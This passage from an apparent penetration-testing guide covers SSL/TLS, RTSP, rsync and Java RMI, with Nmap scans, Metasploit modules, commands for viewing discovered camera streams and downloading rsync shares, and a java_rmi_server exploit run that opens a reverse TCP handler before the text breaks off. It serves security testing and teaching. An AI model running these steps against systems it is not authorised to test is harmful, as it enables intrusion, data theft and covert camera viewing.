<span class="o">|</span>     <span class="n">ciphers</span><span class="p">:</span>
<span class="o">|</span>       <span class="n">TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA</span> <span class="o">-</span> <span class="n">E</span>
<span class="o">|</span>       <span class="n">TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span> <span class="p">(</span><span class="n">dh</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">-</span> <span class="n">F</span>
<span class="o">|</span>       <span class="n">TLS_DHE_RSA_WITH_AES_128_CBC_SHA</span> <span class="p">(</span><span class="n">dh</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">-</span> <span class="n">F</span>
<span class="o">|</span>       <span class="n">TLS_DHE_RSA_WITH_AES_256_CBC_SHA</span> <span class="p">(</span><span class="n">dh</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">-</span> <span class="n">F</span>
<span class="o">|</span>       <span class="n">TLS_DHE_RSA_WITH_DES_CBC_SHA</span> <span class="p">(</span><span class="n">dh</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">-</span> <span class="n">F</span>
<span class="o">|</span>       <span class="n">TLS_RSA_EXPORT_WITH_DES40_CBC_SHA</span> <span class="o">-</span> <span class="n">E</span>
<span class="o">|</span>       <span class="n">TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5</span> <span class="o">-</span> <span class="n">E</span>
<span class="o">|</span>       <span class="n">TLS_RSA_EXPORT_WITH_RC4_40_MD5</span> <span class="o">-</span> <span class="n">E</span>
<span class="o">|</span>       <span class="n">TLS_RSA_WITH_3DES_EDE_CBC_SHA</span> <span class="o">-</span> <span class="n">F</span>
<span class="o">|</span>       <span class="n">TLS_RSA_WITH_AES_128_CBC_SHA</span> <span class="o">-</span> <span class="n">F</span>
<span class="o">|</span>       <span class="n">TLS_RSA_WITH_AES_256_CBC_SHA</span> <span class="o">-</span> <span class="n">F</span>
<span class="o">|</span>       <span class="n">TLS_RSA_WITH_DES_CBC_SHA</span> <span class="o">-</span> <span class="n">F</span>
<span class="o">|</span>       <span class="n">TLS_RSA_WITH_RC4_128_MD5</span> <span class="o">-</span> <span class="n">F</span>
<span class="o">|</span>       <span class="n">TLS_RSA_WITH_RC4_128_SHA</span> <span class="o">-</span> <span class="n">F</span>
<span class="o">|</span>     <span class="n">compressors</span><span class="p">:</span>
<span class="o">|</span>       <span class="n">NULL</span>
<span class="o">|</span>     <span class="n">cipher</span> <span class="n">preference</span><span class="p">:</span> <span class="n">client</span>
<span class="o">|</span>     <span class="n">warnings</span><span class="p">:</span>
<span class="o">|</span>       <span class="n">CBC</span><span class="o">-</span><span class="n">mode</span> <span class="n">cipher</span> <span class="ow">in</span> <span class="n">SSLv3</span> <span class="p">(</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2014</span><span class="o">-</span><span class="mi">3566</span><span class="p">)</span>
<span class="o">|</span>       <span class="n">Ciphersuite</span> <span class="n">uses</span> <span class="n">MD5</span> <span class="k">for</span> <span class="n">message</span> <span class="n">integrity</span>
<span class="o">|</span>       <span class="n">Insecure</span> <span class="n">certificate</span> <span class="n">signature</span><span class="p">:</span> <span class="n">MD5</span>
<span class="o">|</span>   <span class="n">TLSv1</span><span class="o">.</span><span class="mi">0</span><span class="p">:</span>
<span class="o">|</span>     <span class="n">ciphers</span><span class="p">:</span>
<span class="o">|</span>       <span class="n">TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA</span> <span class="o">-</span> <span class="n">E</span>
<span class="o">|</span>       <span class="n">TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span> <span class="p">(</span><span class="n">dh</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">-</span> <span class="n">F</span>
<span class="o">|</span>       <span class="n">TLS_DHE_RSA_WITH_AES_128_CBC_SHA</span> <span class="p">(</span><span class="n">dh</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">-</span> <span class="n">F</span>
<span class="o">|</span>       <span class="n">TLS_DHE_RSA_WITH_AES_256_CBC_SHA</span> <span class="p">(</span><span class="n">dh</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">-</span> <span class="n">F</span>
<span class="o">|</span>       <span class="n">TLS_DHE_RSA_WITH_DES_CBC_SHA</span> <span class="p">(</span><span class="n">dh</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">-</span> <span class="n">F</span>
<span class="o">|</span>       <span class="n">TLS_RSA_EXPORT_WITH_DES40_CBC_SHA</span> <span class="o">-</span> <span class="n">E</span>
<span class="o">|</span>       <span class="n">TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5</span> <span class="o">-</span> <span class="n">E</span>
<span class="o">|</span>       <span class="n">TLS_RSA_EXPORT_WITH_RC4_40_MD5</span> <span class="o">-</span> <span class="n">E</span>
<span class="o">|</span>       <span class="n">TLS_RSA_WITH_3DES_EDE_CBC_SHA</span> <span class="o">-</span> <span class="n">F</span>
<span class="o">|</span>       <span class="n">TLS_RSA_WITH_AES_128_CBC_SHA</span> <span class="o">-</span> <span class="n">F</span>
<span class="o">|</span>       <span class="n">TLS_RSA_WITH_AES_256_CBC_SHA</span> <span class="o">-</span> <span class="n">F</span>
<span class="o">|</span>       <span class="n">TLS_RSA_WITH_DES_CBC_SHA</span> <span class="o">-</span> <span class="n">F</span>
<span class="o">|</span>       <span class="n">TLS_RSA_WITH_RC4_128_MD5</span> <span class="o">-</span> <span class="n">F</span>
<span class="o">|</span>       <span class="n">TLS_RSA_WITH_RC4_128_SHA</span> <span class="o">-</span> <span class="n">F</span>
<span class="o">|</span>     <span class="n">compressors</span><span class="p">:</span>
<span class="o">|</span>       <span class="n">NULL</span>
<span class="o">|</span>     <span class="n">cipher</span> <span class="n">preference</span><span class="p">:</span> <span class="n">client</span>
<span class="o">|</span>     <span class="n">warnings</span><span class="p">:</span>
<span class="o">|</span>       <span class="n">Ciphersuite</span> <span class="n">uses</span> <span class="n">MD5</span> <span class="k">for</span> <span class="n">message</span> <span class="n">integrity</span>
<span class="o">|</span>       <span class="n">Insecure</span> <span class="n">certificate</span> <span class="n">signature</span><span class="p">:</span> <span class="n">MD5</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">least</span> <span class="n">strength</span><span class="p">:</span> <span class="n">F</span>

<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">1.81</span> <span class="n">seconds</span>
</pre></div>
</div>
</div>
<div class="section" id="ssl-heartbleed">
<h4>ssl-heartbleed<a class="headerlink" href="#ssl-heartbleed" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ssl-heartbleed.html">ssl-heartbleed.nse</a> : Detects whether a server is vulnerable to the OpenSSL Heartbleed bug (CVE-2014-0160).</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>nmap -p 443 --script ssl-heartbleed 223.30.xx.xx -n

Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:35 IST
Nmap scan report for 223.30.xx.xx
Host is up (0.011s latency).
PORT    STATE SERVICE
443/tcp open  https
| ssl-heartbleed:
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|
|     References:
|       http://cvedetails.com/cve/2014-0160/
|       http://www.openssl.org/news/secadv_20140407.txt
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160

Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds
</pre></div>
</div>
</div>
<div class="section" id="ssl-poodle">
<h4>ssl-poodle<a class="headerlink" href="#ssl-poodle" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ssl-poodle.html">ssl-poodle.nse</a> : Checks whether SSLv3 CBC ciphers are allowed (POODLE). POODLE is CVE-2014-3566</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>nmap -p 443 --script ssl-poodle 223.30.xx.xx -n

Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:40 IST
Nmap scan report for 223.30.xx.xx
Host is up (0.011s latency).
PORT    STATE SERVICE
443/tcp open  https
| ssl-poodle:
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  OSVDB:113251
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and
|           other products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the &quot;POODLE&quot; issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA
|     References:
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|       http://osvdb.org/113251
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|_      https://www.imperialviolet.org/2014/10/14/poodle.html
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="rtsp-port-554-and-8554">
<h2>RTSP - Port 554 and 8554<a class="headerlink" href="#rtsp-port-554-and-8554" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id39">
<h3>Nmap<a class="headerlink" href="#id39" title="Permalink to this headline">¶</a></h3>
<p>Two NSE for RTSP which are</p>
<div class="section" id="rtsp-methods">
<h4>rtsp-methods<a class="headerlink" href="#rtsp-methods" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/rtsp-methods.html">rtsp-methods.nse</a> : which determines which methods are supported by the RTSP (real time streaming protocol) server</p>
<p>RTSP-Methods Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">8554</span> <span class="o">--</span><span class="n">script</span> <span class="n">rtsp</span><span class="o">-</span><span class="n">methods</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="o">-</span><span class="n">sV</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">01</span> <span class="mi">23</span><span class="p">:</span><span class="mi">17</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">22.195</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.015</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
<span class="mi">8554</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">rtsp</span>    <span class="n">Geovision</span> <span class="n">webcam</span> <span class="n">rtspd</span>
<span class="o">|</span><span class="n">_rtsp</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span> <span class="n">OPTIONS</span><span class="p">,</span> <span class="n">DESCRIBE</span><span class="p">,</span> <span class="n">SETUP</span><span class="p">,</span> <span class="n">PLAY</span><span class="p">,</span> <span class="n">PAUSE</span><span class="p">,</span> <span class="n">TEARDOWN</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">Device</span><span class="p">:</span> <span class="n">webcam</span>
</pre></div>
</div>
</div>
<div class="section" id="rtsp-url-brute">
<h4>rtsp-url-brute<a class="headerlink" href="#rtsp-url-brute" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/rtsp-url-brute.html">rtsp-url-brute.nse</a> which Attempts to enumerate RTSP media URLS by testing for common paths on devices such as surveillance IP cameras.</p>
<p>RTSP URL Brute Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.152</span><span class="o">.</span><span class="mf">77.206</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.00047</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>    <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">554</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">rtsp</span>
<span class="o">|</span> <span class="n">rtsp</span><span class="o">-</span><span class="n">url</span><span class="o">-</span><span class="n">brute</span><span class="p">:</span>
<span class="o">|</span>   <span class="n">Discovered</span> <span class="n">URLs</span>
<span class="o">|</span>     <span class="n">rtsp</span><span class="p">:</span><span class="o">//</span><span class="mf">10.152</span><span class="o">.</span><span class="mf">77.206</span><span class="o">/</span><span class="n">media</span><span class="o">/</span><span class="n">video1</span>
<span class="o">|</span><span class="n">_</span>    <span class="n">rtsp</span><span class="p">:</span><span class="o">//</span><span class="mf">10.152</span><span class="o">.</span><span class="mf">77.206</span><span class="o">/</span><span class="n">video1</span>
<span class="n">Once</span> <span class="n">you</span> <span class="n">have</span> <span class="n">this</span><span class="p">,</span> <span class="n">just</span> <span class="n">execute</span> <span class="n">mplayer</span> <span class="n">to</span> <span class="n">watch</span> <span class="n">the</span> <span class="n">live</span> <span class="n">feed</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">mplayer</span> <span class="o">&lt;</span><span class="n">url</span><span class="o">&gt;</span>
<span class="k">for</span> <span class="n">example</span><span class="p">:</span> <span class="n">mplayer</span> <span class="n">rtsp</span><span class="p">:</span><span class="o">//</span><span class="mf">10.152</span><span class="o">.</span><span class="mf">77.206</span><span class="o">/</span><span class="n">media</span><span class="o">/</span><span class="n">video1</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="rsync-port-873">
<h2>Rsync - Port 873<a class="headerlink" href="#rsync-port-873" title="Permalink to this headline">¶</a></h2>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">873</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">S</span> <span class="n">rsync</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<div class="section" id="id40">
<h3>Metasploit<a class="headerlink" href="#id40" title="Permalink to this headline">¶</a></h3>
<div class="section" id="list-rsync-modules">
<h4>List Rsync Modules<a class="headerlink" href="#list-rsync-modules" title="Permalink to this headline">¶</a></h4>
<p>An rsync module is essentially a directory share. These modules can optionally be protected by a password. This module connects to and negotiates with an rsync server, lists the available modules and,  optionally, determines if the module requires a password to access.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">rsync</span><span class="o">/</span><span class="n">modules_list</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">873</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">S</span> <span class="n">rsync</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">873</span> <span class="o">-</span> <span class="mi">5</span> <span class="n">rsync</span> <span class="n">modules</span> <span class="n">found</span><span class="p">:</span> <span class="n">OTG</span> <span class="n">DATA</span><span class="p">,</span> <span class="n">Server</span> <span class="n">IMP</span> <span class="n">Backup</span><span class="p">,</span> <span class="n">Rajan</span> <span class="n">Data</span><span class="p">,</span> <span class="n">test</span><span class="p">,</span> <span class="n">testing</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">1</span> <span class="n">of</span> <span class="mi">4</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">25</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">873</span> <span class="o">-</span> <span class="n">no</span> <span class="n">rsync</span> <span class="n">modules</span> <span class="n">found</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">2</span> <span class="n">of</span> <span class="mi">4</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">50</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">3</span> <span class="n">of</span> <span class="mi">4</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">75</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">4</span> <span class="n">of</span> <span class="mi">4</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">100</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Auxiliary</span> <span class="n">module</span> <span class="n">execution</span> <span class="n">completed</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="id41">
<h3>Nmap<a class="headerlink" href="#id41" title="Permalink to this headline">¶</a></h3>
<div class="section" id="rsync-list-modules">
<h4>rsync-list-modules<a class="headerlink" href="#rsync-list-modules" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/rsync-list-modules.html">rsync-list-modules.nse</a> : Lists modules available for rsync (remote file sync) synchronization.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">873</span> <span class="n">XX</span><span class="o">.</span><span class="n">XX</span><span class="o">.</span><span class="n">XX</span><span class="o">.</span><span class="mi">52</span> <span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">rsync</span><span class="o">-</span><span class="nb">list</span><span class="o">-</span><span class="n">modules</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">06</span> <span class="mi">00</span><span class="p">:</span><span class="mi">05</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">XX</span><span class="o">.</span><span class="n">XX</span><span class="o">.</span><span class="mf">243.52</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.0088</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>    <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">873</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">rsync</span>
<span class="o">|</span> <span class="n">rsync</span><span class="o">-</span><span class="nb">list</span><span class="o">-</span><span class="n">modules</span><span class="p">:</span>
<span class="o">|</span>   <span class="n">mail</span>
<span class="o">|</span>   <span class="n">varlib</span>
<span class="o">|</span>   <span class="n">etc</span>
<span class="o">|</span>   <span class="n">net</span>
<span class="o">|</span>   <span class="n">dar</span>
<span class="o">|</span>   <span class="n">usrlocal</span>
<span class="o">|</span>   <span class="n">varlog</span>
<span class="o">|</span>   <span class="n">var</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">root</span>

<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">0.79</span> <span class="n">seconds</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="id42">
<h3>Other<a class="headerlink" href="#id42" title="Permalink to this headline">¶</a></h3>
<div class="section" id="rsync">
<h4>rsync<a class="headerlink" href="#rsync" title="Permalink to this headline">¶</a></h4>
<p>How to test your rsync setup:</p>
<p>List the available shares by running ( may require a password )</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">rsync</span> <span class="n">rsync</span><span class="p">:</span><span class="o">//</span><span class="n">share</span><span class="nd">@your</span><span class="o">-</span><span class="n">ip</span><span class="o">-</span><span class="ow">or</span><span class="o">-</span><span class="n">hostname</span><span class="o">/</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">rsync</span> <span class="n">rsync</span><span class="p">:</span><span class="o">//</span><span class="n">etc</span><span class="nd">@XX</span><span class="o">.</span><span class="n">XX</span><span class="o">.</span><span class="n">XX</span><span class="o">.</span><span class="mi">52</span>
<span class="n">mail</span>
<span class="n">varlib</span>
<span class="n">etc</span>
<span class="n">net</span>
<span class="n">dar</span>
<span class="n">usrlocal</span>
<span class="n">varlog</span>
<span class="n">var</span>
<span class="n">root</span>
</pre></div>
</div>
<p>After entering your password, rsync should now give a file listing</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">rsync</span> <span class="n">rsync</span><span class="p">:</span><span class="o">//</span><span class="n">pub</span><span class="nd">@your</span><span class="o">-</span><span class="n">ip</span><span class="o">-</span><span class="ow">or</span><span class="o">-</span><span class="n">hostname</span><span class="o">/</span><span class="n">pub</span><span class="o">/</span>
</pre></div>
</div>
<p>We may get access denied because of the IP address restrictions</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">rsync</span> <span class="n">rsync</span><span class="p">:</span><span class="o">//</span><span class="n">etc</span><span class="nd">@XX</span><span class="o">.</span><span class="n">XX</span><span class="o">.</span><span class="n">XX</span><span class="o">.</span><span class="mi">52</span><span class="o">/</span><span class="n">mail</span>
<span class="nd">@ERROR</span><span class="p">:</span> <span class="n">access</span> <span class="n">denied</span> <span class="n">to</span> <span class="n">mail</span> <span class="kn">from</span> <span class="nn">unknown</span> <span class="p">(</span><span class="n">XX</span><span class="o">.</span><span class="mf">4.</span><span class="n">XX</span><span class="o">.</span><span class="n">XX</span><span class="p">)</span>
<span class="n">rsync</span> <span class="n">error</span><span class="p">:</span> <span class="n">error</span> <span class="n">starting</span> <span class="n">client</span><span class="o">-</span><span class="n">server</span> <span class="n">protocol</span> <span class="p">(</span><span class="n">code</span> <span class="mi">5</span><span class="p">)</span> <span class="n">at</span> <span class="n">main</span><span class="o">.</span><span class="n">c</span><span class="p">(</span><span class="mi">1653</span><span class="p">)</span> <span class="p">[</span><span class="n">Receiver</span><span class="o">=</span><span class="mf">3.1</span><span class="o">.</span><span class="mi">1</span><span class="p">]</span>
</pre></div>
</div>
<p>Run:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">rsync</span> <span class="o">-</span><span class="n">v</span> <span class="o">--</span><span class="n">progress</span> <span class="o">--</span><span class="n">partial</span> <span class="n">rsync</span><span class="p">:</span><span class="o">//</span><span class="n">pub</span><span class="nd">@your</span><span class="o">-</span><span class="n">ip</span><span class="o">-</span><span class="ow">or</span><span class="o">-</span><span class="n">hostname</span><span class="o">/</span><span class="n">pub</span><span class="o">/</span><span class="n">someFile</span>

<span class="p">(</span><span class="n">you</span> <span class="n">can</span> <span class="n">abbreviate</span> <span class="o">--</span><span class="n">partial</span> <span class="o">--</span><span class="n">progress</span> <span class="k">as</span> <span class="o">-</span><span class="n">P</span><span class="p">)</span><span class="o">.</span> <span class="n">Your</span> <span class="n">file</span> <span class="n">should</span> <span class="n">now</span> <span class="n">be</span> <span class="n">downloading</span><span class="o">.</span>
</pre></div>
</div>
<p>Run:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">rsync</span> <span class="o">-</span><span class="n">aPv</span> <span class="n">rsync</span><span class="p">:</span><span class="o">//</span><span class="n">pub</span><span class="nd">@your</span><span class="o">-</span><span class="n">ip</span><span class="o">-</span><span class="ow">or</span><span class="o">-</span><span class="n">hostname</span><span class="o">/</span><span class="n">pub</span><span class="o">/</span><span class="n">someDirectory</span> <span class="o">.</span>
<span class="n">Your</span> <span class="n">directory</span> <span class="n">should</span> <span class="n">now</span> <span class="n">be</span> <span class="n">downloading</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="java-rmi-port-1099">
<h2>Java RMI - Port 1099<a class="headerlink" href="#java-rmi-port-1099" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id43">
<h3>Metasploit<a class="headerlink" href="#id43" title="Permalink to this headline">¶</a></h3>
<div class="section" id="java-rmi-server-insecure-endpoint-code-execution-scanner">
<h4>Java RMI Server Insecure Endpoint Code Execution Scanner<a class="headerlink" href="#java-rmi-server-insecure-endpoint-code-execution-scanner" title="Permalink to this headline">¶</a></h4>
<p>Detects RMI endpoints:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">misc</span><span class="o">/</span><span class="n">java_rmi_server</span>
<span class="n">services</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">p</span> <span class="mi">1099</span> <span class="o">-</span><span class="n">S</span> <span class="n">Java</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Failed output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">1099</span> <span class="n">Java</span> <span class="n">RMI</span> <span class="n">Endpoint</span> <span class="n">Detected</span><span class="p">:</span> <span class="n">Class</span> <span class="n">Loader</span> <span class="n">Disabled</span>
</pre></div>
</div>
<p>Successful output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">1099</span> <span class="n">Java</span> <span class="n">RMI</span> <span class="n">Endpoint</span> <span class="n">Detected</span><span class="p">:</span> <span class="n">Class</span> <span class="n">Loader</span> <span class="n">Enabled</span>
</pre></div>
</div>
<p>and then use</p>
</div>
<div class="section" id="java-rmi-server-insecure-default-configuration-java-code-execution">
<h4>Java RMI Server Insecure Default Configuration Java Code Execution<a class="headerlink" href="#java-rmi-server-insecure-default-configuration-java-code-execution" title="Permalink to this headline">¶</a></h4>
<p>Module takes advantage of the default configuration of the RMI Registry and RMI Activation services, which allow loading classes from any remote (HTTP) URL. As it invokes a method in the RMI Distributed Garbage Collector which is available via every RMI endpoint, it can be used against both rmiregistry and rmid, and against most other (custom) RMI endpoints as well. Note that it does not work against Java Management Extension (JMX) ports since those do not support remote class loading, unless another RMI endpoint is active in the same Java process. RMI method calls do not support or require any sort of authentication</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">misc</span><span class="o">/</span><span class="n">java_rmi_server</span>
</pre></div>
</div>
<p>Sample Output</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">misc</span><span class="o">/</span><span class="n">java_rmi_server</span>
<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">java_rmi_server</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">rhost</span> <span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">rhost</span> <span class="o">=&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">java_rmi_server</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">run</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Started</span> <span class="n">reverse</span> <span class="n">TCP</span> <span class="n">handler</span> <span class="n">on</span> <span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">4444</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">URL</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">LAWVrAFTItH7N</span>
